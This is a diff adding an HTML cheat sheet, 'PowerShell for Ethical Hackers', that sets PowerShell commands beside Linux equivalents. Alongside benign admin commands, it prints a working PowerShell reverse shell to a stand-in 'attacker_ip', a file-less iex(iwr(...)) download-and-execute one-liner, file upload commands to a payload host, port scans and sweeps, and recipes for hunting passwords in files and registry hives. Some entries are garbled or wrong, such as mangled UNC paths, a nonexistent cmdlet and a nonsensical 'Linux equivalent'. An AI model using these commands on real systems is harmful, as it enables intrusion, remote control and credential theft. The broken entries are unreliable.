@@ -1,0 +1,1961 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PowerShell for Ethical Hackers</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f4f4f4;
+        }
+        header {
+            background-color: #333;
+            color: #fff;
+            padding: 10px 20px;
+            text-align: center;
+        }
+        h1 {
+            margin: 0;
+        }
+        section {
+            padding: 20px;
+            margin: 20px;
+            background-color: #fff;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+        }
+        code {
+            display: block;
+            background-color: #f7f7f7;
+            padding: 10px;
+            border-radius: 5px;
+            font-family: "Courier New", monospace;
+            white-space: pre-wrap;
+            word-wrap: break-word;
+        }
+        .obfuscator {
+            margin-top: 20px;
+            padding: 20px;
+            background-color: #eef;
+            border-radius: 8px;
+        }
+        input, button {
+            padding: 10px;
+            margin: 5px;
+            font-size: 1em;
+        }
+        .example {
+            background-color: #fff;
+            border: 1px solid #ccc;
+            padding: 10px;
+            margin-bottom: 20px;
+            border-radius: 5px;
+        }
+    </style>
+</head>
+<body>
+
+    <header>
+        <h1>PowerShell for Ethical Hackers</h1>
+        <p>Learn how to use PowerShell for ethical hacking with practical examples.</p>
+    </header>
+
+    <section>
+        <h2>Introduction to PowerShell for Ethical Hackers</h2>
+        <p>PowerShell is a powerful scripting language and shell used by administrators and attackers alike. In the context of ethical hacking, PowerShell can be used for automating tasks, information gathering, vulnerability scanning, and even exploiting weaknesses in systems. Understanding PowerShell is essential for both offensive and defensive security professionals.</p>
+<p>One of the key differences between Windows PowerShell and the BASH shell in Linux is that Microsoft has developed cmdlets (command-lets) for PowerShell. They cmdlets are essentially single commands that accomplish sometimes more complex tasks, similar to functions.</p>
+<p>These cmdlets take the form of verb-noun, such as "get-help".</p>
+<p>Microsoft, recognizing that Linux system administrators are more accustomed to working from the command line and to encourage them to adopt and use the PowerShell, they aliased many of the most common Linux commands into  PowerShell.</p>
+    </section>
+
+    <section>
+        <h2>Basic PowerShell Commands</h2>
+        <p>Here are some basic PowerShell commands that can be useful for ethical hackers:</p>
+        
+        <div class="example">
+            <p><strong>Get System Information:</strong></p>
+            <code>
+Get-ComputerInfo
+$env:computername
+hostname
+
+Check if computer is part of a domain
+(Get-WmiObject -Class Win32_ComputerSystem).PartOfDomain
+
+Get workgroup name
+(Get-WmiObject -Class Win32_ComputerSystem).Workgroup
+
+Check if system is 32-bit or 64-bit
+[System.Environment]::Is64BitOperatingSystem
+(Get-CimInstance -ClassName win32_operatingsystem).OSArchitecture
+
+Get total RAM installed
+[Math]::Round((Get-WmiObject -Class Win32_ComputerSystem).TotalPhysicalMemory/1GB)
+
+List of installed software
+Check Program Files directories:
+Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
+Check HKLM\Software registry:
+Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\Software | ft Name
+
+List of installed hotfixes
+Get-HotFix
+
+List of installed PowerShell versions
+(gp HKLM:\SOFTWARE\Microsoft\PowerShell\*\PowerShellEngine -Name PowerShellVersion).PowerShellVersion
+Currently running PowerShell version
+
+PowerShell:
+$PSVersionTable
+
+Linux equivalent (Bash):
+Control+X Control+V
+
+Get environment variables
+PowerShell:
+Get-Childitem env:
+gci env:
+Linux equivalent:
+
+set
+Get system uptime
+
+PowerShell:
+[Timespan]::FromMilliseconds([Environment]::TickCount)
+Linux equivalent :
+
+uptime
+</code>
+
+<h2>File System</h2>
+<code>
+Filesystem
+Get available disk drives
+
+PowerShell:
+
+Get-PSDrive
+Get-PSProvider -PSProvider FileSystem
+gwmi Win32_Logicaldisk | ft
+Linux equivalent:
+
+df -h
+lsblk
+Print current working directory
+
+PowerShell:
+
+Get-Location
+gl
+Linux equivalent:
+
+pwd
+Open current directory in file manager
+
+PowerShell:
+
+Invoke-Item .
+ii .
+Linux equivalent (GNOME):
+
+nautilus .
+Navigate through filesystem
+
+PowerShell:
+
+Set-Location <path>
+chdir <path>
+si <path>
+cd <path>
+Linux equivalent:
+
+cd <path>
+List all files in current directory
+
+PowerShell:
+
+Get-ChildItem
+gci
+dir
+ls
+Linux equivalent:
+
+ls -l
+dir -l
+echo *
+List hidden files too
+
+PowerShell:
+
+gci -Force
+Linux equivalent:
+
+ls -la
+List only hidden files
+
+PowerShell:
+
+gci -Attributes !D+H
+Linux equivalent:
+
+ls -a | grep "^\."
+List all files recursively
+
+PowerShell:
+
+gci -Recurse
+gci -rec
+gci -rec -depth 1
+Linux equivalent:
+
+ls -Rl
+find . -ls
+find . -maxdepth 1 -ls
+Count files in the current working directory
+
+PowerShell:
+
+(gci).count
+Linux equivalent:
+
+ls | wc -l
+List files in the current directory but exclude some folders
+
+PowerShell:
+
+gci -exclude dir1,dir2,file1
+Linux equivalent:
+
+ls -l -I dir1 -I dir2 -I file1
+List only filenames without any other details
+
+PowerShell:
+
+(gci).name
+Linux equivalent:
+
+ls
+Copy files
+
+PowerShell:
+
+Copy-Item <source> <destination>
+copy <source> <destination>
+cpi <source> <destination>
+cp <source> <destination>
+Linux equivalent:
+
+cp <source> <destination>
+Copy directory
+
+PowerShell:
+
+cp -rec <source> <destinaton>
+Linux equivalent:
+
+cp -r <source> <destination>
+Move / rename files
+
+PowerShell:
+
+Move-Item <source> <destination>
+move <source> <destination>
+mi <source> <destination>
+mv <source> <destination>
+Linux equivalent:
+
+mv <source> <destination>
+Delete files or directories
+
+PowerShell:
+
+Remove-Item <path>
+ri -force <path>
+rm -force <path>
+Linux equivalent:
+
+rm <path>
+rm -f <path>
+Delete directory
+
+PowerShell:
+
+rm -recurse 
+rm -recurse -force 
+rm -rec -for 
+Linux equivalent:
+
+rm -r 
+rm -rf 
+</code>
+
+
+
+
+
+
+
+            </code>
+        </div>
+        
+        <div class="example">
+            <p><strong>Get Active Network Connections:</strong></p>
+            <code>
+Get-NetTCPConnection
+
+Local network diagnostics
+Get list of network interfaces
+
+PowerShell:
+
+Get-NetIpInterface
+Linux equivalent:
+
+ifconfig -a
+ip addr show
+Get list of configured IP addresses
+
+This is useful when ipconfig.exe command is blocked.
+
+PowerShell:
+
+Get-NetIPAddress
+Get-NetIPAddress -InterfaceAlias Ethernet
+Get-NetIPAddress -InterfaceIndex 1
+
+Get-NetIPConfiguration
+Linux equivalent:
+
+ifconfig -a
+ifconfig eth0
+
+ip addr show
+ip addr show eth0
+ARP table
+
+See the list of known MAC addresses and corresponding IP addresses on the local network. This is useful when arp.exe command is disabled.
+
+PowerShell:
+
+Get-NetNeighbor
+Linux equivalent:
+
+arp -an
+ip neigh
+Routing table
+
+See the routing table and the default gateway. This is useful when netstat.exe or route.exe commands are disabled.
+
+PowerShell:
+
+Get-NetRoute
+
+Find-NetRoute -RemoteIPAddress 8.8.8.8
+Linux equivalent:
+
+route
+netstat -nr
+ip route show
+List of network connections (Netstat)
+
+These commands are useful when netstat.exe command is blocked. Note that PowerShell has separated netstat for TCP and UDP protocols.
+
+Netstat for TCP protocol
+
+PowerShell:
+
+Get-NetTCPConnection
+Get-NetTCPConnection -RemotePort 443
+Get-NetTCPConnection -LocalPort 443
+Get-NetTCPConnection -State listen
+Linux equivalent:
+
+netstat -tnape
+netstat -tnape | grep ':443 '
+
+netstat -ltnpe
+Netstat for UDP protocol
+
+PowerShell:
+
+Get-NetUDPEndpoint -verbose
+Linux equivalent:
+
+netstat -unape
+
+
+TCP/IP
+ICMP Ping
+
+This is useful when ping.exe command is blocked.
+
+Get-CIMinstance win32_pingstatus -Filter "address = '<ipofwherepayloadishosted>' and Timeout=1000 and ResolveAddressNames=false" | select StatusCode
+StatusCode = 0 means that the host is alive.
+
+Traceroute
+
+Test-NetConnection -ComputerName 10.10.5.5 -TraceRoute
+Port check
+
+This will try to connect to the specified TCP port, but also will send ICMP ping:
+
+Test-NetConnection -ComputerName 10.10.10.1 -Port 445
+tnc -ComputerName 10.10.10.1 -Port 445
+Port check #2
+
+Faster port check without sending ICMP ping:
+
+New-Object System.Net.Sockets.TCPClient -ArgumentList 10.10.10.1,445
+Port scan a host
+
+Do a port scan of host with IP address <ipofwherepayloadishosted> for selected ports:
+
+$ports = "21 22 23 25 53 80 88 111 139 389 443 445 873 1099 1433 1521 1723 2049 2100 2121 3299 3306 3389 3632 4369 5038 5060 5432 5555 5900 5985 6000 6379 6667 8000 8080 8443 9200 27017"
+$ip = "<ipofwherepayloadishosted>"
+$ports.split(" ") | % {echo ((new-object Net.Sockets.TcpClient).Connect($ip,$_)) "Port $_ is open on $ip"} 2>$null 
+Port sweep of a network
+
+Do a port sweep of 10.10.0.x network for port 445:
+
+$port = 445
+$net = "10.10.0."
+0..255 | foreach { echo ((new-object Net.Sockets.TcpClient).Connect($net+$_,$port)) "Port $port is open on $net$_"} 2>$null
+
+DNS
+Get list of configured DNS servers
+
+PowerShell:
+
+Get-DnsClientServerAddress
+Linux equivalent:
+
+cat /etc/resolv.conf
+systemd-resolve --status
+nmcli dev show | grep DNS
+DNS hostname lookup
+
+PowerShell:
+
+Resolve-DNSname google.com
+(Resolve-DNSname google.com).ipaddress
+Linux equivalent:
+
+host -t a google.com
+dig google.com a +short
+DNS hostname lookup #2
+
+PowerShell:
+
+[System.Net.Dns]::Resolve('google.com').AddressList.IPAddressToString
+Linux equivalent:
+
+getent hosts google.com
+DNS hostname lookup #3
+
+[System.Net.Dns]::GetHostAddresses('google.com').IPAddressToString
+DNS reverse lookup
+
+PowerShell:
+
+Resolve-DNSname 8.8.8.8
+(Resolve-DNSname 8.8.8.8).namehost
+Linux equivalent:
+
+host -t ptr 8.8.8.8
+dig -x 8.8.8.8 +short
+DNS reverse lookup #2
+
+PowerShell:
+
+[System.Net.Dns]::Resolve('8.8.8.8').hostname
+Linux equivalent:
+
+getent hosts 8.8.8.8
+DNS reverse lookup #3
+
+[System.Net.Dns]::GetHostEntry('8.8.8.8').HostName
+Mass DNS reverse lookup
+
+Perform reverse DNS lookup of 10.10.0.x subnet and save the list of found hostnames in the hostnames.txt file.
+
+$net = "10.10.0."
+0..255 | foreach {Resolve-DNSname -ErrorAction SilentlyContinue $net$_ | ft NameHost -HideTableHeaders} | Out-String -Stream | where {$_ -ne ""} | tee hostnames.txt
+Mass DNS reverse lookup #2
+
+Perform reverse DNS lookup of 10.10.0.x subnet and save output in IP HOSTNAME format in the ip_hostname.txt file.
+
+$net = "10.10.0."
+0..255 | foreach {$r=(Resolve-DNSname -ErrorAction SilentlyContinue $net$_ | ft NameHost -HideTableHeaders | Out-String).trim().replace("\s+","").replace("`r","").replace("`n"," "); Write-Output "$net$_ $r"} | tee ip_hostname.txt
+
+
+Network shared drives
+These cmdlets are useful when net.exe command is disabled.
+
+Enumerate local SMB/CIFS network shares
+
+Get-WmiObject -class Win32_Share
+Enumerate local SMB/CIFS network shares #2
+
+Get-CimInstance -Class Win32_Share
+Enumerate local SMB/CIFS network shares #3
+
+Alternate (newer) way using the SmbShare module:
+
+Get-SmbShare
+Enumerate remote SMB/CIFS network shares
+
+Get-WmiObject -class Win32_Share -ComputerName <IP|hostname>
+Enumerate remote SMB/CIFS network shares #2
+
+Alternate (newer) way using the SmbShare module via PSSession. Note that this requires that the remote computer has PS Remoting enabled.
+
+Invoke-Command -ComputerName 'IP|hostname' -ScriptBlock {Get-SmbShare}
+We can also list permissions who can mount the remote network shares using Get-SmbShareAccess like this:
+
+Invoke-Command -ComputerName 'IP|hostname' -ScriptBlock {(Get-SmbShare).name | % {Get-SmbShareAccess -Name $_}}
+Enumerate remote SMB/CIFS network shares #3
+
+Another method using SmbShare module and PS Remoting, but this time via a CIM session.
+
+New-CimSession -ComputerName 'IP|hostname' -Credential $creds
+Note the CIM session id. Now list the network shares via the CIM session like this:
+
+Get-SmbShare -CimSession $(Get-CimSession -id 1)
+In the end close the CIM session:
+
+Remove-CimSession -id 1
+Access remote SMB/CIFS network drive
+
+Using instant mapping via pushd and popd:
+
+Push-Location \2.168.204.190\drive
+
+# In the end disconnect from the network drive:
+Pop-Location
+Access remote SMB/CIFS network drive #2
+
+$n = New-Object -ComObject "Wscript.Network"
+$n.MapNetworkDrive("x:", "\2.168.204.190\Public")
+x:
+
+# In the end remove the network share:
+$n.RemoveNetworkDrive("x:")
+Access remote SMB/CIFS network drive #3
+
+This method works in PowerShell 3.0 and above.
+
+New-PSDrive -name mydrive -PSProvider FileSystem -root "\2.168.204.190\Public"
+mydrive:
+
+# In the end remove the network share:
+Remove-PSDrive mydrive
+Access remote SMB/CIFS network drive #4
+
+This method works in PowerShell 5.0 and above.
+
+New-SmbMapping -LocalPath x: -RemotePath \2.168.204.190\Public
+x:
+
+# In the end remove the network drive:
+Remove-SmbMapping -LocalPath x: -force
+Access remote SMB/CIFS network drive #5 using credentials
+
+$n = New-Object -ComObject "Wscript.Network"
+$n.MapNetworkDrive("x:", "\2.168.204.190\data", $true, 'domain\username', 'password')
+x:
+
+# In the end remove the network share:
+$n.RemoveNetworkDrive("x:")
+List currently mapped network drives
+
+(New-Object -ComObject WScript.Network).EnumNetworkDrives()
+Create a guest network drive
+
+PowerShell:
+
+new-item "c:\test\dir" -itemtype directory
+New-SmbShare -Name "testdir" -Path "C:\test\dir" -FullAccess "Everyone","Guests","Anonymous Logon"
+
+# To stop it afterwards:
+Remove-SmbShare -Name "testdir" -Force
+Linux equivalent:
+
+mkdir /new/dir
+/opt/impacket/examples/smbserver.py testdir /new/dir
+
+# To stop it, simply terminate it:
+
+
+            </code>
+        </div>
+        
+        <div class="example">
+            <p><strong>Find Listening Ports:</strong></p>
+            <code>
+Get-Netstat -an | Select-String "LISTEN"
+            </code>
+        </div>
+    </section>
+
+    <section>
+        <h2>PowerShell for Reconnaissance</h2>
+        <p>PowerShell can be used to gather valuable information during reconnaissance phases of ethical hacking:</p>
+
+        <div class="example">
+            <p><strong>Enumerate Running Processes:</strong></p>
+            <code>
+Get-Process
+
+Processes
+List processes
+
+PowerShell:
+Get-Process
+ps
+Linux equivalent:
+ps aux
+
+List processes matching process name
+PowerShell:
+ps <pattern>
+Linux equivalent:
+pgrep -a <pattern>
+
+List processes matching a pattern
+PowerShell:
+ps | out-string -stream | select-string <pattern>
+Linux equivalent:
+ps aux | grep <pattern>
+pgrep -a -f <pattern>
+
+Kill process by PID
+PowerShell:
+Stop-Process -Id <PID>
+kill <PID>
+kill -Force <PID>
+Linux equivalent:
+kill <PID>
+kill -KILL <PID>
+
+Kill processes matching process name
+PowerShell:
+Get-Process <name> | Stop-Process
+ps <name> | kill
+ps notepad | kill
+ps notepad | kill -Force
+Linux equivalent:
+pkill <name>
+pkill vim
+pkill -KILL vim
+
+
+
+
+
+
+            </code>
+        </div>
+        
+        <div class="example">
+            <p><strong>List All Services Running:</strong></p>
+            <code>
+Get-Service
+            </code>
+        </div>
+        
+        <div class="example">
+            <p><strong>Find Installed Software:</strong></p>
+            <code>
+Get-WmiObject -Class Win32_Product
+
+
+
+
+            </code>
+        </div>
+    </section>
+
+    <section>
+        <h2>PowerShell for Exploitation</h2>
+        <p>Ethical hackers can leverage PowerShell for penetration testing tasks, such as exploiting vulnerabilities or executing payloads:</p>
+
+        <div class="example">
+            <p><strong>Invoke Reverse Shell:</strong></p>
+            <code>
+$client = New-Object System.Net.Sockets.TCPClient('attacker_ip', 4444);
+$stream = $client.GetStream();
+[byte[]]$bytes = 0..255|%{0};
+while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
+  $data = (new-object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i);
+  $sendback = (iex $data 2>&1 | Out-String );
+  $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
+  $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
+  $stream.Write($sendbyte, 0, $sendbyte.Length);
+  $stream.Flush()
+}
+            </code>
+
+<h2>Downloading Files</h2>
+<code>
+HTTP data transfer
+Download file
+
+Using WebClient class:
+
+(New-Object System.Net.WebClient).DownloadFile("http://<ipofwherepayloadishosted>/a.exe","c:\test\a.exe")
+Upload file
+
+This works out-of-the-box with SimpleHTTPServerWithUpload.py:
+
+(New-Object System.Net.WebClient).UploadFile("http://<ipofwherepayloadishosted>/", "POST", "c:\test\file.zip");
+Download file #2
+
+Using Invoke-WebRequest cmdlet:
+
+Invoke-WebRequest -Uri "http://<ipofwherepayloadishosted>/a.exe" -OutFile "C:\test\a.exe"
+wget -Uri "http://<ipofwherepayloadishosted>/a.exe" -OutFile "C:\test\a.exe"
+curl -Uri "http://<ipofwherepayloadishosted>/a.exe" -OutFile "C:\test\a.exe"
+iwr -Uri "http://<ipofwherepayloadishosted>/a.exe" -OutFile "C:\test\a.exe"
+Upload file #2
+
+wget -Uri "http://<ipofwherepayloadishosted>/" -InFile "C:\test\file.zip" -Method Post
+wget -Uri "http://<ipofwherepayloadishosted>/" -InFile "C:\test\file.zip" -Method Put
+Download file #3
+
+Using Invoke-RestMethod cmdlet:
+
+Invoke-RestMethod -Uri "http://<ipofwherepayloadishosted>/file.exe" -OutFile "file.exe"
+Upload file #3
+
+Invoke-RestMethod -Uri "http://<ipofwherepayloadishosted>/" -Method Post -InFile "C:\test\file.zip"
+Invoke-RestMethod -Uri "http://<ipofwherepayloadishosted>/" -Method Put -InFile "C:\test\file.zip"
+Download file #4
+
+Using BitsTransfer cmdlet:
+
+Import-Module BitsTransfer
+Start-BitsTransfer -source "http://<ipofwherepayloadishosted>/a.exe" -destination "a.exe"
+
+</code>
+<h2>Text encoding & decoding</h2>
+<code>
+Text encoding and decoding
+DOS to UNIX
+
+This is to convert files created under Windows/DOS with carriage return as part of the newline (\r\n) to a Unix format, which only uses newline (\n).
+
+(gc file.txt -Raw).replace("`r`n","`n") | out-file -nonewline file.unix.txt
+UNIX to DOS
+
+gc file.unix.txt > file.dos.txt
+UTF to ASCII
+
+gc file.txt | out-file -encoding ASCII file.ascii.txt
+ASCII to UTF
+
+gc file.txt | out-file -encoding UTF8 file.utf8.txt
+Base64 encode
+
+This is for encoding binary data into text form and vice versa.
+
+[System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes("Text to encode"))
+Base64 decode
+
+[System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String("<base64 string here>"))
+URL encode
+
+URL encoding (also known as percent encoding) is used to encode information in URIs and related web technologies (e.g. / becomes %2F).
+
+[System.Net.WebUtility]::UrlEncode('<text to encode>')
+URL decode
+
+[System.Net.WebUtility]::UrlDecode('%3Ctext+to+decode%3E')
+HTML entities encode
+
+HTML encoding is used to convert characters that are disallowed in HTML, since they are part of the HTML language (e.g. < becomes &lt;)
+
+Add-Type -AssemblyName System.Web
+[System.Web.HttpUtility]::HtmlEncode('<text to encode>')
+HTML entities decode
+
+Add-Type -AssemblyName System.Web
+[System.Web.HttpUtility]::HtmlDecode('&lt;text to decode&gt;')
+HTML entities encode #2
+
+Alternate way in PowerShell 3.0 and above:
+
+[System.Net.WebUtility]::HtmlEncode('<text to encode>')
+HTML entities decode #2
+
+[System.Net.WebUtility]::HtmlDecode('&lt;text to decode&gt;')
+Go back to top.
+
+Number conversion
+Decimal to Hex
+
+PowerShell:
+
+'{0:X}' -f 123456
+[System.Convert]::ToString(123456, 16)
+[System.String]::Format('{0:X}', 123456)
+Linux equivalent:
+
+printf '%X\n' 123456
+echo 'obase=16; 123456' | bc -lq
+Hex to Decimal
+
+PowerShell:
+
+'{0:d}' -f 0x1e240
+[System.Convert]::ToString(0x1e240, 10)
+[System.String]::Format('{0:d}', 0x1e240)
+Linux equivalent:
+
+printf '%d\n' 0x1E240
+echo $((0x1E240))
+echo 'ibase=16; 1E240' | bc -lq
+
+</code>
+<h2>File Hash</h2>
+<code>
+Get a checksum (hash) of a file
+
+PowerShell:
+
+Get-FileHash file.txt
+Get-FileHash -Algorithm MD5 file.txt
+Get only the hash value:
+
+(Get-FileHash file.txt).hash
+Linux equivalent:
+
+sha256sum file.txt
+md5sum file.txt
+Hide a file or directory
+
+(get-item test.txt).Attributes += 'Hidden'
+Unhide a file or directory
+
+(get-item test.txt -force).Attributes -= 'Hidden'
+
+
+</code>
+
+<h2>Working w/ Files & Text</h2>
+<code>
+
+Working with files and text
+Read a file
+
+PowerShell:
+
+Get-Content file.txt
+gc file.txt
+cat file.txt
+Linux equivalent:
+
+cat file.txt
+Sort file and remove duplicated lines
+
+PowerShell:
+
+Get-Content file.txt | Sort-Object -unique
+gc file.txt | sort -u
+Linux equivalent:
+
+cat file.txt | sort -u
+sort -u <file.txt
+Read a file and remove empty lines
+
+PowerShell:
+
+(gc file.txt) | ? {$_.trim() -ne "" }
+Linux equivalent:
+
+grep -v '^\s*$' file.txt
+Match pattern in a file (grep)
+
+PowerShell:
+
+gc file.txt | select-string pattern
+gc file.txt | sls pattern
+Linux equivalent:
+
+grep pattern file.txt
+Count number of lines in a file
+
+PowerShell:
+
+(gc file.txt).count
+gc file.txt | measure -line
+Linux equivalent:
+
+wc -l file.txt
+Get first 10 lines of a file (head)
+
+PowerShell:
+
+gc -head 10 file.txt
+gc file.txt | select -first 10
+Linux equivalent:
+
+head -10 file.txt
+cat file.txt | head -10
+Get last 10 lines of a file (tail)
+
+PowerShell:
+
+gc -tail 10 file.txt
+gc file.txt | select -last 10
+Linux equivalent:
+
+tail -10 file.txt
+cat file.txt | tail -10
+Get only the 10th line from a file
+
+PowerShell:
+
+(gc file.txt)[9]
+gc file.txt | select -index 10
+Linux equivalent:
+
+
+head -10 file.txt | tail -1
+Continuous read from a file (wait for input)
+
+PowerShell:
+
+gc -tail 10 -wait file.txt
+Linux equivalent:
+
+tail -f file.txt
+Create an empty file
+
+PowerShell:
+
+Set-Content file.txt -Value $null
+sc file.txt -Value $null
+Linux equivalent:
+
+touch file.txt
+Read file and replace a string
+
+PowerShell:
+
+(gc file.txt).replace("abc","xyz")
+Linux equivalent:
+
+sed -e 's/abc/xyz/g' <file.txt
+Read file and replace multiple strings
+
+PowerShell:
+
+(gc file.txt).replace("abc","xyz").replace("def","opq")
+Linux equivalent:
+
+sed -e 's/abc/xyz/g;s/def/opq/g' <file.txt
+Read file and replace multiple strings #2
+
+PowerShell:
+
+$a = gc file.txt
+$a -replace "abc","xyz" -replace "def","opq"
+Linux equivalent:
+
+cat file.txt | sed -e 's/abc/xyz/g' | sed -e 's/def/opq/g'
+
+
+Do something for each file in current directory
+
+PowerShell:
+
+foreach ($f in $(gci)) {echo $f.Name}
+Linux equivalent:
+
+for f in *; do echo $a; done
+Do something for each line in a file
+
+PowerShell:
+
+gc file.txt | foreach { echo $_ }
+Linux equivalent:
+
+while read a; do echo $a; done <file.txt
+Do something for each line in a file #2
+
+PowerShell:
+
+foreach ($a in $(gc file.txt)) { echo $a }
+Linux equivalent:
+
+cat file.txt | while read a; do echo $a; done
+Generate list of 10.0.10.x IP addresses
+
+PowerShell:
+
+1..255 | foreach{"10.0.10."+$_} > ips.txt
+Linux equivalent:
+
+for a in {0..255}; do echo 10.0.10.$a; done > ips.txt
+
+</code>
+
+<h2>Registry</h2>
+<code>
+
+Registry
+These commands are useful when reg.exe command is disabled.
+
+List registry subkeys
+
+ls HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion | select name
+ls Registry::HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion | select name
+(ls HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion).name
+We can also use the cd command to browse the registry like a file system:
+
+cd HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion
+(ls).name
+cd ..
+(ls).name
+Read all values under a registry subkey
+
+Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion"
+gp "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion"
+Also while browsing the registry:
+
+cd "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion"
+gp .
+Read a specific value under a registry subkey
+
+Example to get a Windows version from registry:
+
+gp "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion" | select ProductName
+(gp "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion").ProductName
+Also while browsing the registry:
+
+cd "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion"
+(gp .).ProductName
+Create a registry value
+
+New-ItemProperty HKCU:\Software -name "test value" -value 123
+Also while browsing the registry:
+
+cd "HKCU:\Software"
+New-ItemProperty . -name "test value" -value 123
+Delete registry value
+
+Remove-ItemProperty HKCU:\Software -name "test value"
+rp HKCU:\Software -name "test value"
+Also while browsing the registry:
+
+cd "HKCU:\Software"
+rp . -name "test value"
+Create registry subkey
+
+New-Item "HKCU:\software" -Name "test key"
+ni "HKCU:\software" -Name "test key"
+Also while browsing the registry:
+
+cd "HKCU:\Software"
+ni . -Name "test key"
+cd "test key"
+Delete registry subkey
+
+Remove-Item "HKCU:\software\test key" -recurse
+rm "HKCU:\software\test key" -recurse
+rm "HKCU:\software\test key" -recurse -force
+Search for string in registry subkeys
+
+This will go recursively through registry and search for the given pattern in registry subkeys:
+
+$path = "HKCU:\"
+$pattern = "pattern"
+gci "$path" -rec -ea SilentlyContinue | sls "$pattern"
+Search for string in registry values
+
+This will go recursively through registry and search for the given pattern in value names or value data.
+
+$path = "HKCU:\"
+$pattern = "pattern"
+gci "$path" -rec -ea SilentlyContinue | % { if((gp $_.PsPath -ea SilentlyContinue) -match "$pattern") { $_.PsPath; $_ | out-string -stream | sls "$pattern" } }
+
+</code>
+<h2>Services</h2>
+<code>
+Services
+These cmdlets are useful when sc.exe command is disabled.
+
+List of services
+
+PowerShell:
+
+Get-Service
+Linux equivalent:
+
+service --status-all
+systemctl --type=service
+Check status of a service
+
+PowerShell:
+
+Get-Service <name>
+Get-Service winrm | select *
+Linux equivalent:
+
+service <name> status
+service ssh status
+List of running / stopped services
+
+PowerShell:
+
+Get-Service | Where-Object {$_.Status -eq "Running"}
+Get-Service | Where-Object {$_.Status -eq "Stopped"}
+Linux equivalent:
+
+systemctl --type=service --state=active
+systemctl --type=service --state=inactive
+Start / Stop a service
+
+PowerShell:
+
+Start-Service <name>
+Stop-Service <name>
+Linux equivalent:
+
+service <name> start
+service <name> stop
+
+
+</code>
+<h2>Post Exploitation Commands</h2>
+<code>
+Find recursively interesting file names
+
+gci . -Include *pass*.txt,*pass*.xml,*pass*.ini,*pass*.xlsx,*cred*,*vnc*,*.config*,*accounts* -File -Recurse -EA SilentlyContinue
+Find recursively sysprep or unattended files
+
+These files may contain plain text passwords.
+
+gci . -Include *sysprep.inf,*sysprep.xml,*sysprep.txt,*unattended.xml,*unattend.xml,*unattend.txt -File -Recurse -EA SilentlyContinue
+Find recursively configuration files, which contain string “password”
+
+gci . -Include *.txt,*.xml,*.config,*.conf,*.cfg,*.ini -File -Recurse -EA SilentlyContinue | Select-String -Pattern "password"
+Find recursively web server configuration files
+
+Search for IIS, XAMPP, Apache, or PHP configuration files. These files may contain plain text passwords or other interesting information.
+
+gci c:\ -Include web.config,applicationHost.config,php.ini,httpd.conf,httpd-xampp.conf,my.ini,my.cnf -File -Recurse -EA SilentlyContinue
+Search registry for auto-logon credentials
+
+gp 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon' | select "Default*"
+Check if AlwaysInstallElevated is enabled
+
+gp 'HKCU:\Software\Policies\Microsoft\Windows\Installer' -Name AlwaysInstallElevated
+gp 'HKLM:\Software\Policies\Microsoft\Windows\Installer' -Name AlwaysInstallElevated
+Find unquoted service paths
+
+gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
+Search for SNMP community string in registry
+
+gci HKLM:\SYSTEM\CurrentControlSet\Services\SNMP -Recurse -EA SilentlyContinue
+Search for password string in registry keys and values
+
+Search for password pattern recursively in all registry hives (HKCR, HKCU, HKLM, HKU, and HKCC):
+
+$pattern = "password"
+$hives = "HKEY_CLASSES_ROOT","HKEY_CURRENT_USER","HKEY_LOCAL_MACHINE","HKEY_USERS","HKEY_CURRENT_CONFIG"
+
+# Search in registry keys
+foreach ($r in $hives) { gci "registry::${r}\" -rec -ea SilentlyContinue | sls "$pattern" }
+
+# Search in registry values
+foreach ($r in $hives) { gci "registry::${r}\" -rec -ea SilentlyContinue | % { if((gp $_.PsPath -ea SilentlyContinue) -match "$pattern") { $_.PsPath; $_ | out-string -stream | sls "$pattern" }}}
+
+</code>
+<h2>File-less Download & Execute</h2>
+<code>
+File-less download and execute
+Using this tiny PowerShell command we can easily download and execute arbitrary PowerShell code that is hosted remotely – either on our own machine or on the Internet:
+
+iex(iwr("https://URL"))
+iwr = Invoke-WebRequest
+iex = Invoke-Expression
+
+</code>
+<h2>Dump Creds</h2>
+<code>
+Find potentially interesting files
+With this command we can identify files with potentially sensitive data such as account information, credentials, configuration files etc. based on their filename:
+
+gci c:\ -Include *pass*.txt,*pass*.xml,*pass*.ini,*pass*.xlsx,*cred*,*vnc*,*.config*,*accounts* -File -Recurse -EA SilentlyContinue
+Although this can produce a lot of noise, it can also yield some very interesting results.
+
+Recommended to do this for every disk drive, but you can also just run it on the c:\users folder for some quick wins.
+
+Find credentials in Sysprep or Unattend files
+This command will look for remnants from automated installation and auto-configuration, which could potentially contain plaintext passwords or base64 encoded passwords:
+
+gci c:\ -Include *sysprep.inf,*sysprep.xml,*sysprep.txt,*unattended.xml,*unattend.xml,*unattend.txt -File -Recurse -EA SilentlyContinue
+This is one of the well known privilege escalation techniques, as the password is typically local administrator password.
+
+Recommended to do this for every disk drive.
+
+Find configuration files containing “password” string
